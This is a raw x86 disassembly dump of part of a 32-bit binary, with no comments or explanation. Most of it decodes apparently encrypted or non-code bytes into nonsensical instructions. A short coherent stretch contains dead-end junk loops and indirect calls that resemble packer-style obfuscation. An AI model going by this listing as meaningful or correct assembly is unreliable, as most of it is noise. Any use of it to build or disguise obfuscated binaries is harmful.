  40cbca:	lods   al,BYTE PTR ds:[si]
  40cbcc:	test   eax,0xa55a13ad
  40cbd1:	fcomi  st,st(1)
  40cbd3:	outs   dx,BYTE PTR ds:[esi]
  40cbd4:	sahf   
  40cbd5:	and    BYTE PTR [esi-0x5d],0xf5
  40cbd9:	mov    bl,0x8b
  40cbdb:	adc    ebp,DWORD PTR [edi+0x46]
  40cbde:	pop    ds
  40cbdf:	popa   
  40cbe0:	rcl    BYTE PTR [esi+0x3e5a63d1],1
  40cbe6:	inc    edx
  40cbe7:	aam    0x0
  40cbe9:	shl    DWORD PTR [edi+0x32],0x5a
  40cbed:	into   
  40cbee:	jle    0x40cc69
  40cbf0:	push   cs
  40cbf1:	ss mov ecx,0xefbe776
  40cbf7:	cmp    dh,bh
  40cbf9:	daa    
  40cbfa:	stos   DWORD PTR es:[edi],eax
  40cbfb:	ss int3 
  40cbfd:	jmp    0x12bf:0x2d056727
  40cc04:	sahf   
  40cc05:	out    0x64,al
  40cc07:	gs je  0x40cba9
  40cc0a:	sub    al,0xfd
  40cc0c:	push   ecx
  40cc0d:	cdq    
  40cc0e:	mov    es,WORD PTR [esi+esi*1]
  40cc11:	icebp  
  40cc12:	or     esp,DWORD PTR [edi-0x6d]
  40cc15:	or     esp,eax
  40cc17:	icebp  
  40cc18:	cmp    ch,bh
  40cc1a:	sub    BYTE PTR [esi-0x5f1e0f23],ah
  40cc20:	add    al,0x75
  40cc22:	out    0x1d,eax
  40cc24:	stos   BYTE PTR es:[edi],al
  40cc25:	jns    0x40cbb9
  40cc27:	and    DWORD PTR [edx],ebp
  40cc29:	mov    BYTE PTR [eax],dl
  40cc2b:	js     0x40cc75
  40cc2d:	adc    al,BYTE PTR fs:[edx+0x43]
  40cc31:	push   esp
  40cc32:	into   
  40cc33:	fisubr DWORD PTR [ebx]
  40cc35:	rol    BYTE PTR [edi],cl
  40cc37:	adc    edx,DWORD PTR [esp+ecx*1+0x5cf5d3d]
  40cc3e:	hlt    
  40cc3f:	iret   
  40cc40:	pop    ss
  40cc41:	pop    ds
  40cc42:	outs   dx,DWORD PTR ds:[esi]
  40cc43:	mov    ebp,0x10699937
  40cc48:	sahf   
  40cc49:	inc    ebx
  40cc4a:	push   edi
  40cc4b:	cwde   
  40cc4c:	xor    eax,0xbc487009
  40cc51:	dec    ebx
  40cc52:	mov    eax,0xacc1ece9
  40cc57:	sub    al,0x73
  40cc59:	outs   dx,BYTE PTR ds:[esi]
  40cc5a:	pop    ds
  40cc5b:	xor    BYTE PTR [ebp+0x2],ch
  40cc5e:	out    dx,al
  40cc5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc60:	push   bx
  40cc62:	or     DWORD PTR es:[esi],edi
  40cc65:	test   BYTE PTR [ecx+0x78],dl
  40cc68:	or     eax,0x29c9c9a8
  40cc6d:	aas    
  40cc6e:	ins    DWORD PTR es:[edi],dx
  40cc6f:	mov    al,ds:0x80adad
  40cc74:	gs pop eax
  40cc76:	gs in  al,0x73
  40cc79:	enter  0xca42,0x44
  40cc7d:	cmp    eax,0x483b7d0d
  40cc82:	sar    bh,1
  40cc84:	add    bl,dh
  40cc86:	inc    esp
  40cc87:	and    ch,BYTE PTR [esi+0x56863b9b]
  40cc8d:	fild   DWORD PTR [eax]
  40cc8f:	xor    bh,BYTE PTR [esp+ecx*8]
  40cc92:	je     0x40cc3b
  40cc94:	rol    BYTE PTR [edi+0x17],1
  40cc97:	test   BYTE PTR [edi+0x10],0x61
  40cc9b:	lods   eax,DWORD PTR ds:[esi]
  40cc9c:	or     al,ch
  40cc9e:	outs   dx,BYTE PTR ds:[esi]
  40cc9f:	inc    esp
  40cca0:	add    ah,BYTE PTR cs:[ebp+0xa]
  40cca4:	mov    edx,0xc5c161b5
  40cca9:	lds    edx,FWORD PTR [ebp-0x63]
  40ccac:	imul   ebp,DWORD PTR [eax+0x76de5398],0x5e4010d2
  40ccb6:	mov    edx,0x5247d38
  40ccbc:	jmp    0x40ccc4
  40ccbe:	add    BYTE PTR ds:0x56411182,ah
  40ccc4:	jb     0x40cc92
  40ccc6:	mov    dl,0x49
  40ccc8:	rcl    BYTE PTR [edi-0x30],0x7e
  40cccc:	(bad)  
  40ccce:	retf   0xc307
  40ccd1:	mov    al,BYTE PTR ds:0x809a3990
  40ccd7:	bound  ebp,QWORD PTR [esi+edi*1-0x1084c115]
  40ccde:	js     0x40cd55
  40cce0:	adc    BYTE PTR [eax-0xfcc28a6],ah
  40cce6:	adc    eax,0xb70e711f
  40cceb:	fcmovbe st,st(6)
  40cced:	frstor [edi+0x15]
  40ccf0:	loope  0x40ccad
  40ccf2:	dec    ebx
  40ccf3:	sub    cl,dl
  40ccf5:	mov    DWORD PTR [esp+ebx*8],esi
  40ccf8:	and    eax,0x3c4c4d3d
  40ccfd:	push   0x12ddfeff
  40cd02:	mov    al,ds:0x94b40dc
  40cd07:	out    dx,al
  40cd08:	inc    edi
  40cd09:	shl    ebx,cl
  40cd0b:	idiv   DWORD PTR [eax]
  40cd0d:	dec    esp
  40cd0e:	into   
  40cd0f:	jnp    0x40ccf0
  40cd11:	mov    ecx,0xde4601ea
  40cd16:	icebp  
  40cd17:	xchg   BYTE PTR [esi-0x50],dh
  40cd1a:	fdiv   DWORD PTR [edi]
  40cd1c:	repz xor bh,BYTE PTR [edx+0x33660790]
  40cd23:	inc    edi
  40cd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd25:	mov    bh,0xf5
  40cd27:	lea    ebx,[esi+0x20]
  40cd2a:	cmp    DWORD PTR ds:0x97d675d4,0xffffff89
  40cd31:	jecxz  0x40cd29
  40cd33:	lds    esp,FWORD PTR [ecx+0x5b]
  40cd36:	jo     0x40cd24
  40cd38:	jbe    0x40cd1a
  40cd3a:	mov    ch,0x91
  40cd3c:	ins    BYTE PTR es:[edi],dx
  40cd3d:	test   al,0xae
  40cd3f:	and    DWORD PTR [esi+esi*4],0xffffffb9
  40cd43:	push   esp
  40cd44:	test   eax,0xd3942ed8
  40cd49:	(bad)  
  40cd4a:	dec    ch
  40cd4c:	sti    
  40cd4d:	or     dh,0xb1
  40cd50:	sbb    dl,BYTE PTR [esi+0x2cb97c81]
  40cd56:	popf   
  40cd57:	rcl    DWORD PTR [esi],cl
  40cd59:	pop    ss
  40cd5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd5b:	xor    esp,eax
  40cd5d:	dec    esi
  40cd5e:	sbb    BYTE PTR [ebx-0x2a],ah
  40cd61:	enter  0x363a,0x0
  40cd65:	ja     0x40cce8
  40cd67:	pop    ecx
  40cd68:	sbb    eax,0xd95bd603
  40cd6d:	(bad)  [ebx]
  40cd6f:	xor    eax,0xda709073
  40cd74:	xchg   BYTE PTR [esi+0x228f9948],cl
  40cd7a:	ffree  st(7)
  40cd7c:	cmc    
  40cd7d:	pop    edi
  40cd7e:	sub    eax,0xe8afd255
  40cd83:	or     eax,DWORD PTR [ebp+0x7295021d]
  40cd89:	inc    edi
  40cd8a:	call   0xab7cba1d
  40cd8f:	(bad)  
  40cd90:	xchg   ebp,eax
  40cd91:	adc    DWORD PTR ds:0x9c51b320,0xffffffe8
  40cd98:	loop   0x40cd6b
  40cd9a:	ret    0x5352
  40cd9d:	xchg   esi,eax
  40cd9e:	pop    ds
  40cd9f:	and    BYTE PTR [esi-0x20],bl
  40cda2:	iret   
  40cda3:	sar    BYTE PTR [edi+eiz*8+0x2b],cl
  40cda7:	scas   al,BYTE PTR es:[edi]
  40cda8:	icebp  
  40cda9:	jge    0x40cd85
  40cdab:	mov    bh,0xd4
  40cdad:	and    al,0x28
  40cdaf:	fcom   QWORD PTR [ebx+0x19]
  40cdb2:	bound  esi,QWORD PTR [ebp+0x67]
  40cdb5:	popf   
  40cdb6:	jb     0x40ce33
  40cdb8:	imul   edx,DWORD PTR [eax+0x7b],0xffffffe9
  40cdbc:	jmp    0x71d5cad5
  40cdc1:	jecxz  0x40cdce
  40cdc3:	xor    edx,DWORD PTR [edi]
  40cdc5:	(bad)  
  40cdc6:	push   esi
  40cdc7:	xchg   esi,eax
  40cdc8:	push   esi
  40cdc9:	mov    ch,0x4b
  40cdcb:	rcl    BYTE PTR [eax-0x163dfcff],0x6f
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx+0x7ee391be],eax
  40cde3:	fsub   DWORD PTR [eax+0x707080a5]
  40cde9:	leave  
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40cdb7
  40cdee:	test   DWORD PTR [edx+0x38f01bb9],ebp
  40cdf4:	xchg   BYTE PTR [ecx-0x20],bh
  40cdf7:	dec    edx
  40cdf8:	xor    ch,BYTE PTR [edx]
  40cdfa:	pop    eax
  40cdfb:	shl    DWORD PTR [eax+0x4238b48b],0xfb
  40ce02:	mov    ecx,0x71b9f34f
  40ce07:	xchg   ebx,eax
  40ce08:	cmp    BYTE PTR [edx+ebp*2],cl
  40ce0b:	loope  0x40cda6
  40ce0d:	(bad)  
  40ce0e:	outs   dx,DWORD PTR ds:[esi]
  40ce0f:	jg     0x40ce3c
  40ce11:	push   es
  40ce12:	mov    eax,ds:0x699fbc10
  40ce17:	xchg   ecx,eax
  40ce18:	daa    
  40ce19:	inc    edi
  40ce1a:	lods   eax,DWORD PTR ds:[esi]
  40ce1b:	in     al,0xf8
  40ce1d:	(bad)  
  40ce1e:	pop    edx
  40ce1f:	pop    esi
  40ce20:	mov    al,0x6
  40ce22:	repz into 
  40ce24:	outs   dx,BYTE PTR ds:[esi]
  40ce25:	add    BYTE PTR [ebp-0x7a90aca],ah
  40ce2b:	adc    bl,BYTE PTR [ebp+0x5e]
  40ce2e:	mov    cl,0x8
  40ce30:	add    eax,0x6ec4bf30
  40ce35:	or     al,0x80
  40ce37:	ins    DWORD PTR es:[edi],dx
  40ce38:	(bad)  
  40ce39:	js     0x40ce62
  40ce3b:	add    BYTE PTR [esi+0x1e95bf95],al
  40ce41:	call   0x7f3d95fd
  40ce46:	and    bh,bl
  40ce48:	adc    DWORD PTR [eax-0x5d],edi
  40ce4b:	jle    0x40ce78
  40ce4d:	nop
  40ce4e:	mov    ecx,0xbe392178
  40ce53:	in     eax,dx
  40ce54:	paddusw mm4,QWORD PTR [ecx-0x31]
  40ce58:	push   esp
  40ce59:	xchg   bh,al
  40ce5b:	repnz cmp eax,0x9ecaa172
  40ce61:	test   BYTE PTR [esi-0x6596d6da],ch
  40ce67:	sub    eax,0xd8909379
  40ce6c:	not    al
  40ce6e:	jmp    0xa9fefb34
  40ce73:	sbb    al,0x1e
  40ce75:	dec    edx
  40ce76:	adc    al,0x2c
  40ce78:	mov    DWORD PTR [ecx],eax
  40ce7a:	aas    
  40ce7b:	fdivr  DWORD PTR [ecx+ebx*8+0xc9507b1]
  40ce82:	rol    ebp,cl
  40ce84:	and    eax,0x8d0964fa
  40ce89:	sbb    BYTE PTR [edi+0x5019cd3f],ah
  40ce8f:	jmp    0xcad18fa6
  40ce94:	ins    DWORD PTR es:[edi],dx
  40ce95:	sahf   
  40ce96:	outs   dx,DWORD PTR ds:[esi]
  40ce97:	or     eax,0x277a5fc0
  40ce9c:	ficomp DWORD PTR [edi]
  40ce9e:	jle    0x40ceae
  40cea0:	pop    ecx
  40cea1:	sub    eax,0xc0b0e44c
  40cea6:	cwde   
  40cea7:	jb     0x40cedf
  40cea9:	hlt    
  40ceaa:	cmc    
  40ceab:	sbb    al,0x24
  40cead:	add    al,0x38
  40ceaf:	or     dl,cl
  40ceb1:	add    ebp,esp
  40ceb3:	jle    0x40ce7a
  40ceb5:	dec    edx
  40ceb6:	retf   
  40ceb7:	pop    ebp
  40ceb8:	cli    
  40ceb9:	push   edi
  40ceba:	dec    ecx
  40cebb:	fs pop ebx
  40cebd:	int    0x46
  40cebf:	shl    BYTE PTR [ecx+ebx*4],1
  40cec2:	mov    bl,0xcb
  40cec4:	leave  
  40cec5:	dec    esi
  40cec6:	and    ebx,DWORD PTR [eax]
  40cec8:	push   eax
  40cec9:	and    eax,0xa89d89e9
  40cece:	push   cs
  40cecf:	push   edx
  40ced0:	imul   DWORD PTR [edi-0x76def464]
  40ced6:	repnz les ecx,FWORD PTR [ebx+0x4]
  40ceda:	mov    dh,0x4f
  40cedc:	xor    ah,dl
  40cede:	or     BYTE PTR [edx+0x543d4994],ah
  40cee4:	dec    eax
  40cee5:	xor    esi,DWORD PTR [ebx-0x6306d0b8]
  40ceeb:	rol    DWORD PTR [ecx+0x65],cl
  40ceee:	push   cs
  40ceef:	xchg   ebp,eax
  40cef0:	into   
  40cef1:	ror    BYTE PTR [edi+0x2ee54451],1
  40cef7:	mov    edi,0x501d01b
  40cefc:	pop    ecx
  40cefd:	inc    edi
  40cefe:	mov    dl,0xe0
  40cf00:	cmp    eax,0x2f637a7b
  40cf05:	xchg   ch,bl
  40cf07:	repnz inc ebx
  40cf09:	scas   eax,DWORD PTR es:[edi]
  40cf0a:	loop   0x40cebd
  40cf0c:	mov    dl,0x49
  40cf0e:	adc    ebx,ecx
  40cf10:	loopne 0x40cf1c
  40cf12:	xchg   edi,eax
  40cf13:	add    BYTE PTR [ecx+0x81be236],0xd2
  40cf1a:	jae    0x40cf00
  40cf1c:	repnz add eax,0x59ad540d
  40cf22:	sub    eax,0x1faa962a
  40cf27:	and    ch,cl
  40cf29:	ficom  WORD PTR [eax-0x18]
  40cf2c:	xchg   ecx,eax
  40cf2d:	adc    BYTE PTR [edi+0x67],dh
  40cf30:	retf   
  40cf31:	xor    al,0x84
  40cf33:	add    eax,0xef40e6f7
  40cf38:	jbe    0x40cfa6
  40cf3a:	inc    ebp
  40cf3b:	daa    
  40cf3c:	mov    edx,0x19363701
  40cf41:	aas    
  40cf42:	inc    ebx
  40cf43:	fucomip st,st(3)
  40cf45:	cmp    ecx,DWORD PTR [eax]
  40cf47:	sbb    al,cl
  40cf49:	push   eax
  40cf4a:	jl     0x40cf0f
  40cf4c:	add    BYTE PTR [ebp-0x50],0x4b
  40cf50:	sub    al,0x60
  40cf52:	cwde   
  40cf53:	sub    BYTE PTR [edx],ah
  40cf55:	mov    eax,ds:0xdda4ec3e
  40cf5a:	(bad)
  40cf5e:	sar    DWORD PTR [ebx],1
  40cf60:	inc    ebp
  40cf61:	jae    0x40cf1c
  40cf63:	adc    al,0x46
  40cf65:	add    bh,BYTE PTR [ebx-0x7f6a2dd9]
  40cf6b:	cs (bad) 
  40cf6d:	bound  edi,QWORD PTR [eax-0x28]
  40cf70:	fidivr WORD PTR [eax+0xb]
  40cf73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf74:	jl     0x40cf03
  40cf76:	xor    al,0x23
  40cf78:	jle    0x40cfab
  40cf7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf7b:	adc    BYTE PTR [ecx-0x64],0x41
  40cf7f:	xchg   ebx,eax
  40cf80:	pop    edi
  40cf81:	es out dx,eax
  40cf83:	add    BYTE PTR [ecx-0x721b7068],dl
  40cf89:	daa    
  40cf8a:	pop    ds
  40cf8b:	stos   DWORD PTR es:[edi],eax
  40cf8c:	sub    BYTE PTR [esi],dh
  40cf8e:	fwait
  40cf8f:	jg     0x40cf78
  40cf91:	cdq    
  40cf92:	mov    al,ds:0x294fdc41
  40cf97:	jge    0x40cfec
  40cf99:	xchg   ebx,eax
  40cf9a:	imul   DWORD PTR [edi+0x6c0595b]
  40cfa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa1:	cmp    edi,ebp
  40cfa3:	fiadd  DWORD PTR [eax+0x38]
  40cfa6:	and    al,0x89
  40cfa8:	out    0xde,al
  40cfaa:	out    0xc7,eax
  40cfac:	daa    
  40cfad:	out    0xb4,eax
  40cfaf:	out    dx,al
  40cfb0:	or     bl,cl
  40cfb2:	fcmovnu st,st(7)
  40cfb4:	xor    ebp,DWORD PTR [ebx-0x37]
  40cfb7:	push   ebx
  40cfb8:	inc    ebx
  40cfb9:	fldz   
  40cfbc:	ror    BYTE PTR [esi-0x2b720da0],1
  40cfc2:	lds    esi,FWORD PTR [ebp+0x2eec71b]
  40cfc8:	add    esp,eax
  40cfca:	rcr    DWORD PTR [edx+0x7a],1
  40cfcd:	cwde   
  40cfce:	fnstcw WORD PTR [edx]
  40cfd0:	or     ebx,DWORD PTR cs:[edx+0x2]
  40cfd4:	jle    0x40d030
  40cfd6:	inc    esp
  40cfd7:	stc    
  40cfd8:	push   es
  40cfd9:	shl    BYTE PTR [si+0xa],0x8c
  40cfde:	adc    DWORD PTR [ecx+esi*4-0x6ff3c4d3],ebx
  40cfe5:	sar    DWORD PTR [ebp-0x571db8d2],0x14
  40cfec:	(bad)  
  40cfed:	in     eax,dx
  40cfee:	sub    al,0x58
  40cff0:	xor    dh,BYTE PTR [ebp+0x120eeba0]
  40cff6:	popf   
  40cff7:	xchg   edi,eax
  40cff8:	jl     0x40d045
  40cffa:	xor    cl,BYTE PTR [ebp+ebx*1-0x5bad869a]
  40d001:	cmp    eax,0x68b1744e
  40d006:	sbb    BYTE PTR [ecx+0x374aefad],0x97
  40d00d:	lds    eax,FWORD PTR [ecx-0x1d]
  40d010:	rol    DWORD PTR [edi+eiz*8+0x7520406e],cl
  40d017:	pop    es
  40d018:	(bad)  
  40d019:	retf   0xc50e
  40d01c:	sub    esi,DWORD PTR [edi+0x180bd748]
  40d022:	jae    0x40cff4
  40d024:	into   
  40d025:	push   ebp
  40d026:	popa   
  40d027:	dec    ecx
  40d028:	arpl   WORD PTR [ecx+0x7c],sp
  40d02b:	fcmovnbe st,st(7)
  40d02d:	push   ebp
  40d02e:	ror    DWORD PTR [esi],cl
  40d030:	lods   eax,DWORD PTR ds:[esi]
  40d031:	pop    eax
  40d032:	in     eax,0xc9
  40d034:	or     edx,esp
  40d036:	mov    ch,0x7e
  40d038:	and    DWORD PTR ds:0xc5571738,edx
  40d03e:	mov    eax,0x7fc80703
  40d043:	cdq    
  40d044:	mov    ds:0x41621c,eax
  40d049:	mov    eax,DWORD PTR [ebp+0xc]
  40d04c:	xor    eax,ecx
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4343be
  40d088:	mov    ecx,DWORD PTR ds:0x432972
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434396,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434396,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434396,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432c6a
  40d0d1:	cmp    DWORD PTR ds:0x434396,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434396
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434396,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434396
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434396,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434372,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434372
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434372,ecx
  40d118:	cmp    DWORD PTR ds:0x434372,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434372,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432dc6
  40d137:	call   DWORD PTR ds:0x4329ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432e6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434431
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43437e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432dde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432704,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434421,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43438a,0x11
  40d197:	cmp    DWORD PTR ds:0x43438a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43438a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432c6e
  40d1c4:	cmp    DWORD PTR ds:0x43438a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43438a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43438a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43438a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43438a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432dd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434396
  40d1fe:	mov    DWORD PTR ds:0x432dd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43436e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434425,0x43436a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434376,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434415,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434421,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434421
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434421,ecx
  40d255:	cmp    DWORD PTR ds:0x434421,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434421,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4329f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4326fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4326fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4326fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432d22
  40d2ba:	cmp    DWORD PTR ds:0x4326fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4326fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4326fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4326fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4326fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4326f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434429
  40d2fa:	add    DWORD PTR ds:0x434392,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0xb39f624d
  40d319:	jne    0x40d2e4
  40d31b:	jle    0x40d2aa
  40d31d:	jo     0x40d38f
  40d31f:	dec    ecx
  40d320:	jge    0x40d392
  40d322:	jo     0x40d330
  40d324:	outs   dx,BYTE PTR ds:[esi]
  40d325:	sub    DWORD PTR [esp+eax*1-0x47],edx
  40d329:	pop    eax
  40d32a:	(bad)  
  40d32b:	nop
  40d32c:	adc    cl,al
  40d32e:	aam    0x53
  40d330:	in     eax,dx
  40d331:	in     eax,0xe0
  40d333:	add    al,bl
  40d335:	mov    esp,0x47939c7b
  40d33a:	jecxz  0x40d373
  40d33c:	fs mov ebp,0x83811393
  40d342:	frstor ds:0xb0763348
  40d348:	jbe    0x40d337
  40d34a:	retf   
  40d34b:	jo     0x40d351
  40d34d:	imul   ebx,DWORD PTR [esi+0x42],0x6e
  40d351:	rcr    BYTE PTR [ebp-0x236e37f3],0xdd
  40d358:	xchg   edi,eax
  40d359:	mov    ecx,0xa853ed72
  40d35e:	cdq    
  40d35f:	jb     0x40d308
  40d361:	loope  0x40d312
  40d363:	mov    cl,0xbc
  40d365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d366:	add    BYTE PTR [edi+0x56],bh
  40d369:	in     al,dx
  40d36a:	iret   
  40d36b:	je     0x40d312
  40d36d:	cmp    al,0xac
  40d36f:	jno    0x40d34f
  40d371:	test   cl,ch
  40d373:	imul   BYTE PTR [ecx+0x76]
  40d376:	jge    0x40d2fb
  40d378:	add    dl,bh
  40d37a:	bound  edx,QWORD PTR [ecx]
  40d37c:	hlt    
  40d37d:	cmp    eax,ebp
  40d37f:	jmp    0xa108:0x564479e0
  40d386:	jg     0x40d39b
  40d388:	mov    ds:0x8a589b58,al
  40d38d:	pop    ecx
  40d38e:	lods   eax,DWORD PTR ds:[esi]
  40d38f:	sahf   
  40d390:	(bad)  
  40d391:	js     0x40d3b0
  40d393:	mov    esi,edx
  40d395:	arpl   sp,sp
  40d397:	int    0x45
  40d399:	je     0x40d384
  40d39b:	jmp    0x40d3fa
  40d39d:	lods   al,BYTE PTR ds:[esi]
  40d39e:	sub    BYTE PTR [ecx+edi*8],cl
  40d3a1:	fwait
  40d3a2:	and    BYTE PTR [edi+eiz*2+0x48],bh
  40d3a6:	pop    ds
  40d3a7:	xchg   ebp,eax
  40d3a8:	das    
  40d3a9:	fst    st(6)
  40d3ab:	fwait
  40d3ac:	shr    DWORD PTR [eax],1
  40d3ae:	sub    bl,ch
  40d3b0:	repnz or ebp,eax
  40d3b3:	ins    DWORD PTR es:[edi],dx
  40d3b4:	out    dx,eax
  40d3b5:	rcl    BYTE PTR [edx],cl
  40d3b7:	jmp    0x8136ddb8
  40d3bc:	jno    0x40d34a
  40d3be:	sbb    ah,0x38
  40d3c1:	aaa    
  40d3c2:	lahf   
  40d3c3:	outs   dx,DWORD PTR ds:[esi]
  40d3c4:	push   esp
  40d3c5:	xor    ebp,DWORD PTR [ebx]
  40d3c7:	fwait
  40d3c8:	in     al,dx
  40d3c9:	mov    dl,0xb7
  40d3cb:	in     al,0xe4
  40d3cd:	xor    BYTE PTR cs:[edx+edi*1-0x7],0xfa
  40d3d3:	sbb    eax,0x6ff2300f
  40d3d8:	ins    DWORD PTR es:[edi],dx
  40d3d9:	adc    eax,0xa2f74fc0
  40d3de:	out    dx,al
  40d3df:	and    eax,0x5c10d159
  40d3e4:	or     al,0x44
  40d3e6:	out    0xb1,eax
  40d3e8:	data16 or al,0xc6
  40d3eb:	lods   eax,DWORD PTR ds:[esi]
  40d3ec:	xor    DWORD PTR [eax],ebx
  40d3ee:	es xchg edx,ecx
  40d3f1:	jns    0x40d464
  40d3f3:	or     dl,BYTE PTR [ecx-0x2c]
  40d3f6:	dec    edx
  40d3f7:	adc    DWORD PTR [ecx],edx
  40d3f9:	and    bh,BYTE PTR [edx]
  40d3fb:	mov    al,ds:0x20a25bd
  40d400:	pop    ebp
  40d401:	clc    
  40d402:	xchg   edi,eax
  40d403:	in     eax,0x34
  40d405:	dec    esi
  40d406:	imul   eax,DWORD PTR [ebx-0x1c],0xc4111044
  40d40d:	and    al,0x78
  40d40f:	dec    edi
  40d410:	xor    DWORD PTR [esi-0x72],esp
  40d413:	and    al,0xdc
  40d415:	mov    WORD PTR [ebx+0x5e],?
  40d418:	and    BYTE PTR [esi],0xe5
  40d41b:	xor    al,0xd7
  40d41d:	xchg   ebp,eax
  40d41e:	mov    ecx,?
  40d420:	sub    edi,esp
  40d422:	mov    WORD PTR [ecx+ebp*1],ds
  40d425:	or     al,0xd8
  40d427:	pop    edx
  40d428:	xor    DWORD PTR [edx],eax
  40d42a:	sti    
  40d42b:	adc    dl,BYTE PTR [eax+0x1a]
  40d42e:	push   esi
  40d42f:	xor    eax,0x3ce97438
  40d434:	jbe    0x40d3dc
  40d436:	aad    0x9f
